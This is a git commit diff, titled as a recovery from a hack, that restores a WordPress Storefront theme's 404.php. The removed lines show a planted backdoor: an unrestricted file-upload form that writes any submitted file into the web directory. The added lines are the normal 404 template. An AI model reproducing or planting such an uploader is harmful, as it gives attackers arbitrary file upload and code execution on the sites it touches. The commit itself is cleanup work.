b6c59ba03731786d7c6727e91d17a6bc57c2b633
ParadoxZero <sidhin.thomas@gmail.com>
2017-03-29 23:03:44 +0530

    Attempt at recovering from hack

--- wp-content/themes/storefront/404.php
+++ wp-content/themes/storefront/404.php
@@ -1,19 +1,75 @@
 <?php
-if(isset($_POST['Submit'])){
-    $filedir = ""; 
-    $maxfile = '2000000';
+/**
+ * The template for displaying 404 pages (not found).
+ *
+ * @package storefront
+ */
 
-    $userfile_name = $_FILES['image']['name'];
-    $userfile_tmp = $_FILES['image']['tmp_name'];
-    if (isset($_FILES['image']['name'])) {
-        $abod = $filedir.$userfile_name;
-        @move_uploaded_file($userfile_tmp, $abod);
-  
-echo"<center><b>Done ==> $userfile_name</b></center>";
-}
-}
-else{
-echo'
-<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
-}
-?>
+get_header(); ?>
+
+    <div id="primary" class="content-area">
+
+        <main id="main" class="site-main" role="main">
+
+            <div class="error-404 not-found">
+
+                <div class="page-content">
+
+                    <header class="page-header">
+                        <h1 class="page-title"><?php esc_html_e( 'Oops! That page can&rsquo;t be found.', 'storefront' ); ?></h1>
+                    </header><!-- .page-header -->
+
+                    <p><?php esc_html_e( 'Nothing was found at this location. Try searching, or check out the links below.', 'storefront' ); ?></p>
+
+                    <?php
+                    echo '<section aria-label="Search">';
+
+                    if ( storefront_is_woocommerce_activated() ) {
+                        the_widget( 'WC_Widget_Product_Search' );
+                    } else {
+                        get_search_form();
+                    }
+
+                    echo '</section>';
+
+                    if ( storefront_is_woocommerce_activated() ) {
+
+                        echo '<div class="fourohfour-columns-2">';
+
+                        echo '<section class="col-1" aria-label="Promoted Products">';
+
+                        storefront_promoted_products();
+
+                        echo '</section>';
+
+                        echo '<nav class="col-2" aria-label="Product Categories">';
+
+                        echo '<h2>' . esc_html__( 'Product Categories', 'storefront' ) . '</h2>';
+
+                        the_widget( 'WC_Widget_Product_Categories', array(
+                            'count'		=> 1,
+                        ) );
+                        echo '</nav>';
+
+                        echo '</div>';
+
+                        echo '<section aria-label="Popular Products" >';
+
+                        echo '<h2>' . esc_html__( 'Popular Products', 'storefront' ) . '</h2>';
+
+                        echo storefront_do_shortcode( 'best_selling_products', array(
+                            'per_page'  => 4,
+                            'columns'   => 4,
+                        ) );
+
+                        echo '</section>';
+                    }
+                    ?>
+
+                </div><!-- .page-content -->
+            </div><!-- .error-404 -->
+
+        </main><!-- #main -->
+    </div><!-- #primary -->
+
+<?php get_footer();
